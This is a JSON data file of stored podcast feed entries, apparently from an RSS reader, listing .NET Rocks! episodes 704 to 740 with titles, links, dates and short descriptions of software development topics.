{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=740","title":"John Petersen is Back on His SOPA Box","published":{"$wrap":"$date","v":1328760000000,"h":"2012-02-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Yes it's true - Carl and Richard are talking to John Petersen about piracy again. In the wake of show 736 on SOPA, a lot more information has come to light on other methods of attacking piracy - using international treaties. And once again, there are problems with the implementation that create nasty side effects for the public.","author":false,"_id":{"$wrap":"$oid","v":152}}
{"k":"0000000082","o":"0000000843","v":"001"}
{"_id":153,"_uid":153,"_dt":1373728933825,"_s":"5fe0e9daa3d960140c80a4174692e0ad"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=739","title":"Eric Sink Distributes His Source","published":{"$wrap":"$date","v":1328587200000,"h":"2012-02-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Eric Sink about his latest work in distributed version control. Eric talks about his latest project called Veracity, an open source distributed version control system that makes it easy for widely distributed teams to share source. The conversation digs into the sometimes subtle variations between source control systems and why their users are loyal and vocal to their preferred products. Lots of digressions and explorations, along with an offer for free books - check out the links for how to get a copy!","author":false,"_id":{"$wrap":"$oid","v":153}}
{"k":"0000000082","o":"0000000771","v":"001"}
{"_id":154,"_uid":154,"_dt":1373728933826,"_s":"bcc4e5ed6e3aad2446e217b58dcbab52"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=738","title":"Rob Labbe Gets Us Rolling on the Security Development Lifecycle","published":{"$wrap":"$date","v":1328155200000,"h":"2012-02-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Rob Labbe about the Security Development Lifecycle (SDL). After a quick detour down the SOPA discussion, Rob fills the boys in on how the SDL maps neatly to a regular development lifecycle, just including security every step of the way. Rob also introduces the tools of the SDL, providing support for every step of the development lifecycle, from requirements to design to implementation and verification.","author":false,"_id":{"$wrap":"$oid","v":154}}
{"k":"0000000082","o":"0000000825","v":"001"}
{"_id":155,"_uid":155,"_dt":1373728933827,"_s":"4a6bfc5daae16ab401505ecec6654e6a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=737","title":"Jeremy Likness is all Silverlight 5","published":{"$wrap":"$date","v":1327982400000,"h":"2012-01-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jeremy Likness about Silverlight 5. Is Silverlight dead? Not by a long shot. Jeremy talks about the great work going on the Silverlight today and how it still is the most efficient way to build applications that run on both Windows and OSX. The conversation drills into the new features of Silverlight 5 and dispels a lot of the myths around the future of Silverlight. Jeremy also talks about Jounce, his MVVM+MEF framework on Codeplex and the relationship between Silverlight and WinRT.","author":false,"_id":{"$wrap":"$oid","v":155}}
{"k":"0000000082","o":"0000000745","v":"001"}
{"_id":156,"_uid":156,"_dt":1373728933828,"_s":"a3c92a06d6a232469503225484609451"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=736","title":"John Petersen Talks About SOPA, Piracy, and Intellectual Property","published":{"$wrap":"$date","v":1327550400000,"h":"2012-01-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to John Petersen about the Stop Online Piracy Act (SOPA). SOPA, which is now defunct, was an attempt to legislate means to stop piracy and counterfeit goods. John digs into the problems with the legislation and the misinformation surrounding it. The conversation also explores alternatives to SOPA, the Megaupload shut down and how much harm piracy is actually doing in the world.","author":false,"_id":{"$wrap":"$oid","v":156}}
{"k":"0000000082","o":"0000000652","v":"001"}
{"_id":157,"_uid":157,"_dt":1373728933829,"_s":"f8df7d6f8d1fe328ae0c05c110e2a113"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=735","title":"Troy Hunt Secures ASP.NET","published":{"$wrap":"$date","v":1327377600000,"h":"2012-01-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Troy Hunt about ASP.NET Security. Troy is an advocate of the Open Web Application Security Project (OWASP) and wrote a set of blog post applying the top ten exploits to ASP.NET. Troy walks through all ten exploits and how they apply to ASP.NET. He's also rolled the posts together into a PDF file - have a listen and a read!","author":false,"_id":{"$wrap":"$oid","v":157}}
{"k":"0000000082","o":"0000000685","v":"001"}
{"_id":158,"_uid":158,"_dt":1373728933830,"_s":"0c53e6660a985c615ceb73bb25049dbc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=734","title":"Chris Sells Unplugged!","published":{"$wrap":"$date","v":1326945600000,"h":"2012-01-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Out of Microsoft and off to Telerik, what will Chris Sells say? Chris starts out talking about his last year at Microsoft, working on Javascript in Windows 8, culminating at Build. Now Chris has moved to Telerik, focusing on building controls for the Windows 8 world that developers will love. The conversation ranges over HTML 5, XAML, XBox, Windows Phone 7, Kinect, tablets and more!","author":false,"_id":{"$wrap":"$oid","v":158}}
{"k":"0000000082","o":"0000000748","v":"001"}
{"_id":159,"_uid":159,"_dt":1373728933831,"_s":"a2ff592133e36c969538de6ec5b2ea82"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=733","title":"Scott Willeke Does Reporting at DevConnections","published":{"$wrap":"$date","v":1326772800000,"h":"2012-01-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Part of a group of shows recorded at DevConnections in November 2011, Carl and Richard talk to Scott Willeke about reporting technologies. The conversation explores the challenges of a widening set of data sources for reporting, including NoSQL. Scott then digs into the issues around embedding reporting solutions into your applications as opposed to web-based reporting. Reporting - love it or hate it, it never goes away!","author":false,"_id":{"$wrap":"$oid","v":159}}
{"k":"0000000082","o":"0000000696","v":"001"}
{"_id":160,"_uid":160,"_dt":1373728933832,"_s":"8600f0afe0a356b48d6c3769258905a4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=732","title":"Carl and Richard Geek Out About Electricity!","published":{"$wrap":"$date","v":1326340800000,"h":"2012-01-12T04:00:00.000Z"},"starred":false,"read":false,"content":"The first Geek Out show of the new year, Carl and Richard talk about electricity. Call it a primer for many geek out shows to come, the conversation starts at the fundamentals of electricity, from individual atoms all the way to multi-gigawatt high-voltage direct current transmission systems. What does the future hold for the electrical grid? The conversation starts here.","author":false,"_id":{"$wrap":"$oid","v":160}}
{"k":"0000000082","o":"0000000877","v":"001"}
{"_id":161,"_uid":161,"_dt":1373728933833,"_s":"507ebd0b3b3a62ff7d23c9056e529679"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=731","title":"Scott Hanselman and the Web Stack of Love!","published":{"$wrap":"$date","v":1326168000000,"h":"2012-01-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to the one-and-only Scott Hanselman, it's the all radio voice show! Scott starts off the conversation explaining the recent move of Scott Guthrie over to Azure - by pointing out that he hasn't moved anywhere, just added Azure to his repetiore. Then the focus goes to the MVC vs. WebForms debate, which isn't a debate at all in Scott's eyes. And then things take a turn for the worse (or is that silly) and Scott starts answering questions on twitter about his hair. Lots of laughs, but not a lot of technical content ensues thereafter.","author":false,"_id":{"$wrap":"$oid","v":161}}
{"k":"0000000082","o":"0000000798","v":"001"}
{"_id":162,"_uid":162,"_dt":1373728933834,"_s":"9e7672910ee22be7489c6287227fd50c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=730","title":"John Papa Looks at the Microsoft Client Landscape","published":{"$wrap":"$date","v":1325736000000,"h":"2012-01-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to John Papa about his views on the client development landscape. John has recently left Microsoft where he was a Silverlight and Windows 8 evangelist. The conversation starts off talking about the state of Silverlight now that Silverlight 5 has shipped and the ascent of HTML 5. John talks about his favorite HTML 5 libraries, including KnockoutJS and JS Render. Finally, the show wraps up with how Windows Phone 7 and Kinect will change the world.","author":false,"_id":{"$wrap":"$oid","v":162}}
{"k":"0000000082","o":"0000000756","v":"001"}
{"_id":163,"_uid":163,"_dt":1373728933835,"_s":"38e89f53d97599de50e1907c92b0b6f0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=729","title":"Jim Holmes Tests Everything","published":{"$wrap":"$date","v":1325563200000,"h":"2012-01-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard start off 2012 remaking a show that was lost at DevConnections, talking to Jim Holmes about testing. After a quick detour to chat about the amazing CodeMash conference that Jim helps run, the conversation dives into why you want to automate your web testing. Jim talks about free tools and pay tools, including Selenium, WatiN and Telerik's Test Automation Studio. Jim mentions a ton of great tools and resources, check out the links!","author":false,"_id":{"$wrap":"$oid","v":163}}
{"k":"0000000082","o":"0000000746","v":"001"}
{"_id":164,"_uid":164,"_dt":1373728933836,"_s":"c7e1a35d0a48c7ae4988806445b4b890"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=728","title":"Corey Haines Code Retreats Globally","published":{"$wrap":"$date","v":1325217600000,"h":"2011-12-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Corey Haines about his global code retreat. But before the discussion starts on code retreats, Corey digs into his interest in teaching children software development using a tool called Scratch. The global code retreat was an event run on December 3 2011 around the world - 93 cities participated. Next year the goal is 200 cities, including a group in Antartica, and if all goes well, the space station too!","author":false,"_id":{"$wrap":"$oid","v":164}}
{"k":"0000000082","o":"0000000916","v":"001"}
{"_id":165,"_uid":165,"_dt":1373728933836,"_s":"a75c98470508df8c35b4a3cd98f533aa"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=727","title":"Steve McConnell Studies Development Practices","published":{"$wrap":"$date","v":1324958400000,"h":"2011-12-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to the one-and-only Steve McConnell about the evolution of software development practices. The conversation digs into where Microsoft is at these days - Steve has been close to the company for many years. Then Steve talks about his focus on what a good software executive looks like, how they can support their team effectively and be part of the success of the development process. Along the way Steve talks about how Agile fits into his views in Code Complete, scrum practices, continuous integration and more! Great insights from one of the best minds in the business!","author":false,"_id":{"$wrap":"$oid","v":165}}
{"k":"0000000082","o":"0000000828","v":"001"}
{"_id":166,"_uid":166,"_dt":1373728933837,"_s":"669d6f79fe1d80887ec7961f1cc3173c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=726","title":"Startups and Cyborg Anthropology at Oredev","published":{"$wrap":"$date","v":1324526400000,"h":"2011-12-22T04:00:00.000Z"},"starred":false,"read":false,"content":"The last of the vignette shows from Oredev, this one only has two parts, but they're oddly related. The first interview is with Aaron Parecki, who talks about taking a side project that was worked on only evenings and weekends into an actual funded startup. Then an amazing conversation with Amber Case, an actual cyborg anthropologist. It's not as weird as you think, as Amber points out, any time you extend your physical or mental abilities with a peice of technology - say, a cell phone, you're a cyborg.","author":false,"_id":{"$wrap":"$oid","v":166}}
{"k":"0000000082","o":"0000000746","v":"001"}
{"_id":167,"_uid":167,"_dt":1373728933838,"_s":"78be260f2ddd2a9312488b395e30330d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=725","title":"Kathy Malone is a Green Developer","published":{"$wrap":"$date","v":1324353600000,"h":"2011-12-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Kathy Malone about green computing. Kathy, who has a day job as an environmental engineer, talks about different types of green behaviour, including turning off PCs over night, using suspend mode and the like. But for developers, there are approaches to building software that consumes fewer resources, both electrical and human energy. Is there an additional price in resources to be paid for touch computing?","author":false,"_id":{"$wrap":"$oid","v":167}}
{"k":"0000000082","o":"0000001085","v":"001"}
{"_id":168,"_uid":168,"_dt":1373728933839,"_s":"7232940170d66c44c62b60fa83f643a6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=724","title":"Communicating at Oredev","published":{"$wrap":"$date","v":1323921600000,"h":"2011-12-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Another of the vignette shows from Oredev, Carl and Richard explore topics of communication. Up first is Udi Dahan, discussing his approach to domain driven design, focusing on communicating deeply with the stakeholders and domain experts to thoroughly explore the domain - even around something on the surface that seem simple like the concept of a customer. Next, Jim Benson digs into Kanban, including the idea of personal Kanban, which like the development and manufacturing methodology, focuses on being able to clearly see how much work is in progress and where things are being delayed from completion. Finally, the one-and-only Jon Skeet, talking about how his technical communication skills have evolved from answering thousands of questions on newsgroups and Stack Overflow.","author":false,"_id":{"$wrap":"$oid","v":168}}
{"k":"0000000082","o":"0000000718","v":"001"}
{"_id":169,"_uid":169,"_dt":1373728933840,"_s":"7b76d472852bd547758bd26de647c1e5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=723","title":"Damian Edwards and David Fowler Persist Connections with SignalR","published":{"$wrap":"$date","v":1323748800000,"h":"2011-12-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Damian Edwards and David Fowler about SignalR. SignalR is a library for providing persistant connections between a web server and a browser by providing an abstraction over top of technologies like WebSockets or even AJAX polling. SignalR requires .NET 4.0 on the back end and jQuery on the front end... although non-browser clients are in the future!","author":false,"_id":{"$wrap":"$oid","v":169}}
{"k":"0000000082","o":"0000001190","v":"001"}
{"_id":170,"_uid":170,"_dt":1373728933841,"_s":"7c044bc57e5c2c247c4c11afe98af1b1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=722","title":"Development Practices at Oredev","published":{"$wrap":"$date","v":1323316800000,"h":"2011-12-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Another set of stories from Oredev, this time around development practices. The first interview is with Dan North, where he discusses how development teams can move beyond just being able to ship software into something he calls hyper-productivity. He talks about teams that ship software twenty times a day! Next up, Jean Tabaka talks about how RallyDev uses Agile practices to make the entire company Agile. At RallyDev every person is involved in planning out the vision of the company quarter to quarter, from developer to executive. Finally, Gary Short digs into the challenges of technical debt - the idea that shortcuts in code increase the cost of development in the long term. Sometimes debt make sense, getting more features shipped in less time. But eventually the debt has to be repaid or the project goes bankrupt, unable to ship new features and ultimately cancelled.","author":false,"_id":{"$wrap":"$oid","v":170}}
{"k":"0000000082","o":"0000000589","v":"001"}
{"_id":171,"_uid":171,"_dt":1373728933843,"_s":"08ed8d1673be67c63ed98cea36b81e3c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=721","title":"Kathleen Dollard and Son talk Algorithms","published":{"$wrap":"$date","v":1323144000000,"h":"2011-12-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Recorded live from the GrapeCity booth at DevConnections, Kathleen Dollard (and her son Ben) talk about his PhD work in algorithms, how they are being utilized by her company, software composition (see show 708 with Juval Lowy), and ruminations on the future of software.","author":false,"_id":{"$wrap":"$oid","v":171}}
{"k":"0000000082","o":"0000000992","v":"001"}
{"_id":172,"_uid":172,"_dt":1373728933843,"_s":"3bf273698af1423756b38d226e3bdf68"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=720","title":"Cool Projects at Oredev","published":{"$wrap":"$date","v":1322712000000,"h":"2011-12-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Next up from Oredev - the cool projects! Carl and Richard talk to the one-and-only Tess Ferrandez from Microsoft. Tess has moved on from the mad debugging skills she blogged about to focus on Kinect and Windows Phone 7. The conversation digs into using Kinect beyond XBox games. Next up, Luca Minudel discusses his experiences building software for Formula One racing, perhaps the ultimate gadget ever! Finally, the show closes with Henrik Andersson of Tobii talking about prototype eye tracking hardware built into a laptop. Tobii also makes a .NET SDK so that you can easily add eye tracking to a XAML application. These are just some of the cool projects that were talked about at Oredev!","author":false,"_id":{"$wrap":"$oid","v":172}}
{"k":"0000000082","o":"0000000538","v":"001"}
{"_id":173,"_uid":173,"_dt":1373728933844,"_s":"b7fc79f26e7f94bdabcc5c636e1b447f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=719","title":"Dr. Neil Roodyn on Vision-Based Systems","published":{"$wrap":"$date","v":1322539200000,"h":"2011-11-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Recorded live from the GrapeCity booth at DevConnections in Las Vegas. Carl and Richard talk to Dr. Neil about his work with Kinect, Surface 2, tablets, smart phones, and how they can all work together in a meeting space.","author":false,"_id":{"$wrap":"$oid","v":173}}
{"k":"0000000082","o":"0000000643","v":"001"}
{"_id":174,"_uid":174,"_dt":1373728933845,"_s":"5e646a0e3442c55f6d40c6e8e898ca54"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=718","title":"Cloud Panel Discussion at DevConnections","published":{"$wrap":"$date","v":1322107200000,"h":"2011-11-24T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevConnections, Carl and Richard were part of a panel discussion on the cloud entitled 'Are We There Yet?' with Brian Noyes, Michele Leroux Bustamante, Brian Prince and Scott Seely. The conversation dug into migrating existing applications to the cloud, greenfield development, security, reliability and scalability.","author":false,"_id":{"$wrap":"$oid","v":174}}
{"k":"0000000082","o":"0000001391","v":"001"}
{"_id":175,"_uid":175,"_dt":1373728933846,"_s":"a8a024d9029b337e35dba8710ef02469"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=717","title":"Data Visualization at Oredev","published":{"$wrap":"$date","v":1321934400000,"h":"2011-11-22T04:00:00.000Z"},"starred":false,"read":false,"content":"The next collection of tales from Oredev focuses on data visualization. The first conversation is with Alastair Allan, talking about his experiences in visualizing the GPS tracking data stored by every iPhone 4. While it was generally known that the iPhone kept a record of every GPS location and WiFi connection, it was not until Alasdair's visualization application let anyone (especially reporters) see on a map exactly what was in their own phone that the story became a sensation. Next, a conversation with Jon Dahl about minimalist programming and it's impact on the readability of code - a different, yet still important type of visualization. Finally the show ends with a conversation with Nora Herting and Heather Willems of ImageThink. ImageThink was at Oredev to create, in real time, graphic visualizations of the keynotes and conference sessions. While not technical specialists themselves, Nora and Heather talk about how really listening to lectures and conversations about technology provides cues for what is important in the visualizations. Visualizations have power!","author":false,"_id":{"$wrap":"$oid","v":175}}
{"k":"0000000082","o":"0000000588","v":"001"}
{"_id":176,"_uid":176,"_dt":1373728933847,"_s":"86c915512005e801f03a11ef321c110f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=716","title":"WinRT Panel Discussion at DevConnections","published":{"$wrap":"$date","v":1321502400000,"h":"2011-11-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Where is Windows 8 taking us? While at DevConnections, Carl and Richard participated in a panel discussion with Tim Huckaby, Billy Hollis, Dr. Neil Roodyn and Paul Sheriff about the new Windows Runtime. Also listen for a brief appearance of the one-and-only Mark Minasi.","author":false,"_id":{"$wrap":"$oid","v":176}}
{"k":"0000000082","o":"0000000946","v":"001"}
{"_id":177,"_uid":177,"_dt":1373728933848,"_s":"dfad7b0385e366064d8b26cb2df8e92d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=715","title":"Web Development at Oredev","published":{"$wrap":"$date","v":1321329600000,"h":"2011-11-15T04:00:00.000Z"},"starred":false,"read":false,"content":"The first of the vignette shows from Oredev, this show focuses on web development. The first conversation is with Peter Moskovits, talking about using HTML 5 WebSockets to build real bi-directional communicating applications in the browser. The second part of the show the boys talk to Troels Thomsen about building web applications in the cloud using AppHarbor. AppHarbor focuses on making it simple to take existing ASP.NET applications into the cloud. Finally, the last conversation is with Robby Ingebretsen talking about how closely related designers and developers actually are. A great group of stories and one of many sets from Oredev!","author":false,"_id":{"$wrap":"$oid","v":177}}
{"k":"0000000082","o":"0000000969","v":"001"}
{"_id":178,"_uid":178,"_dt":1373728933849,"_s":"05228ea07b477ba0e7777b43a1253eed"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=714","title":"Dan Hanan and Danny Warren Mix Kinect and Metro","published":{"$wrap":"$date","v":1320897600000,"h":"2011-11-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Dan Hanan and Danny Warren about mixing Kinect together with WinRT. Back at the Build conference keynote a 'marketecture' diagram showed how existing applications still work in Windows 8 but also introduced a new platform using WinRT. At the time attendees were told that the blue side (existing applications) and the green side (WinRT) will never cross. Then the folks at Interknowlogy got to work. Dan and Danny talk about how they built an application utilizing Kinect, depending on an SDK that runs on the blue side to communicate with a Metro application that runs on the green side. Crossing the streams? You bet!","author":false,"_id":{"$wrap":"$oid","v":178}}
{"k":"0000000082","o":"0000001024","v":"001"}
{"_id":179,"_uid":179,"_dt":1373728933850,"_s":"337daee5c3112bb33fbd08e2de8cf736"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=713","title":"Neil McIsaac Develops SharePoint in the Cloud","published":{"$wrap":"$date","v":1320724800000,"h":"2011-11-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Neil McIsaac about building SharePoint sites in the cloud. The conversation starts out talking about the state of SharePoint development - that the combination of SharePoint 2010 and Visual Studio 2010 really works! Neil also talks about Silverlight's role in SharePoint as well as LightSwitch. Finally, Neil digs into the challenges around SharePoint in the cloud. After spending some time talking about SharePoint hosting options, Neil digs into SharePoint Online, which is Microsoft's SharePoint offering in Office 365. Neil talks about the challenges of SharePoint in the cloud, including multitenancy, claims-based security and scalability. SharePoint works in the cloud!","author":false,"_id":{"$wrap":"$oid","v":179}}
{"k":"0000000082","o":"0000000751","v":"001"}
{"_id":180,"_uid":180,"_dt":1373728933851,"_s":"4a961f7376d8fda21972c90f2c696754"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=712","title":"Scott Allen Builds Web Pages With Modernizr","published":{"$wrap":"$date","v":1320292800000,"h":"2011-11-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Scott Allen about Modernizr, an open-source JavaScript library that helps you build the next generation of HTML5 and CSS3-powered websites by reporting browser features. Scott talks about how Modernizr focuses on actually testing for the availability of features on a browser, rather than just relying on the browser useragent and a browser capabilities file. Along the way there is plenty of IE6 bashing.","author":false,"_id":{"$wrap":"$oid","v":180}}
{"k":"0000000082","o":"0000000844","v":"001"}
{"_id":181,"_uid":181,"_dt":1373728933852,"_s":"d3a238f452b7fc55775392dceaf49a48"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=711","title":"Tomasz Janczuk Builds Web Apps with node.js","published":{"$wrap":"$date","v":1320120000000,"h":"2011-11-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Tomasz Janczuk about node.js. Node.js is all about building scalable network programs, typically using HTTP. Tomasz talks about how node.js can run as a standalone application that can completely replace a web server, as well as run within IIS as iisnode. iisnode is an implemenation of node.js as a native IIS module. Node.js has been around since 2009, and the community surrounding it is massive - it's only new to the .NET world. Ready to do something totally different on the web from ASP.NET?","author":false,"_id":{"$wrap":"$oid","v":181}}
{"k":"0000000082","o":"0000000493","v":"001"}
{"_id":182,"_uid":182,"_dt":1373728933853,"_s":"cd199d294bc3e7effae99984df35dc2c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=710","title":"Building a Software Business at DevReach","published":{"$wrap":"$date","v":1319688000000,"h":"2011-10-27T04:00:00.000Z"},"starred":false,"read":false,"content":"A great discussion with three successful software entrepeneurs with stories and advice about venturing out on your own in the wild and potentially lucrative world of software.","author":false,"_id":{"$wrap":"$oid","v":182}}
{"k":"0000000082","o":"0000000728","v":"001"}
{"_id":183,"_uid":183,"_dt":1373728933854,"_s":"5324d2516c2f95665db32a169ed602a0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=709","title":"Alexander Groß Deals with Machine Specifications","published":{"$wrap":"$date","v":1319515200000,"h":"2011-10-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Alexander Groß about Machine.Specification (MSpec). MSpec was initially developed by Aaron Jensen as a context/specification framework to help construct tests in a more behaviour driven development style. MSpec provides a language for describing the context and requirements of a test that business owners can read. Trying to get your head around test-first? Check out MSpec!","author":false,"_id":{"$wrap":"$oid","v":183}}
{"k":"0000000082","o":"0000000780","v":"001"}
{"_id":184,"_uid":184,"_dt":1373728933855,"_s":"7563a912505956520d4d0ce28a87e37f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=708","title":"Juval Lowy is a Business Architect","published":{"$wrap":"$date","v":1319083200000,"h":"2011-10-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Juval Lowy about his latest thoughts on software development. As always, Juval has a controversial angle on things. After outlining the problems of current software development approaches, Juval goes on to define a new role in the software development practice, the business architect. While the term is overloaded, the core idea is the ability to model business practices in technology quickly. Has Juval predicted the death of the developer?","author":false,"_id":{"$wrap":"$oid","v":184}}
{"k":"0000000082","o":"0000000947","v":"001"}
{"_id":185,"_uid":185,"_dt":1373728933855,"_s":"758557475f1f47995b9c56143f282cc8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=707","title":"Paul Lewis Sees 3D in HTML 5","published":{"$wrap":"$date","v":1318910400000,"h":"2011-10-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Paul Lewis about doing 3D graphics in HTML 5. Paul has built a 3D engine in HTML 5 called A3. The conversation dives into the power of 3D rendering in the latest generation of browser and how it affects people. Paul talks about how he balances his time between his code monkey work and his undulating monkey work. Richard pops out an article about how physical textures, weight and size affect psychology and how that can impact your UX design. Lots of discussion about building LOB apps in HTML 5 vs. native, as well as how Windows 8 and mobile applications expand the challenge. A classic DotNetRocks conversation!","author":false,"_id":{"$wrap":"$oid","v":185}}
{"k":"0000000082","o":"0000000812","v":"001"}
{"_id":186,"_uid":186,"_dt":1373728933857,"_s":"03abb5050ac56e0ac352ef0947f697cc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=706","title":"Carl and Richard Drive Electric Cars!","published":{"$wrap":"$date","v":1318478400000,"h":"2011-10-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk about electric cars with a special guest - Bruce Meacham! Bruce talks about his experience converting and driving a BMW 325 to pure electric. After talking about conversions, they dig into electric cars like the Telsa Roadster, S and Nissan Leaf. Next, the discussion turns to hybrid cars, with their advantages and disadvantages. The show wraps up with solutions for batteries, including talking a bit about fuel cells. The future is electric cars, so come geek out on them!","author":false,"_id":{"$wrap":"$oid","v":186}}
{"k":"0000000082","o":"0000000902","v":"001"}
{"_id":187,"_uid":187,"_dt":1373728933858,"_s":"ededcc4072e9d05afd6b4fe1317a9650"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=705","title":"Rocky and Billy Introduce WinRT!","published":{"$wrap":"$date","v":1318305600000,"h":"2011-10-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Introducing episode one of The Tablet Show, a new weekly .NET Rocks! spinoff primarily for .NET developers but focused on Tablet development (WinRT/Metro, iOS and Android). For the inaugural show, Carl and Richard talk to Rocky Lhotka and Billy Hollis about their assessments of Windows 8, WinRT and the Metro UI. After discussing what WinRT is, the discussion dives into the real challenges of migrating applications to Metro. Rocky talks about migrating the CSLA Silverlight edition to Metro. The conversation then moves into some of the new services of WinRT, including sharing and search.","author":false,"_id":{"$wrap":"$oid","v":187}}
{"k":"0000000082","o":"0000000780","v":"001"}
{"_id":188,"_uid":188,"_dt":1373728933859,"_s":"54c18bd08df21283bfc8b008b6e7adcd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=704","title":"Philip Laureano Programs In Nemerle","published":{"$wrap":"$date","v":1317873600000,"h":"2011-10-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Philip Laureano about Nemerle. Nemerle is a multi-paradigm programming language for .NET. Similar to C#, it goes beyond C# to provide metaprogramming features, allowing you to write code that changes code on the fly. Phil digs deep into the idea that programming languages should change to reflect what we want to do and is not afraid to do the changes himself, rather than wait for Microsoft. Brain twisting? Wait til you listen to the show!","author":false,"_id":{"$wrap":"$oid","v":188}}
{"k":"0000000082","o":"0000000678","v":"001"}
{"_id":189,"_uid":189,"_dt":1373728933859,"_s":"68efe44142bb45bc678640eba07c8ac2"}
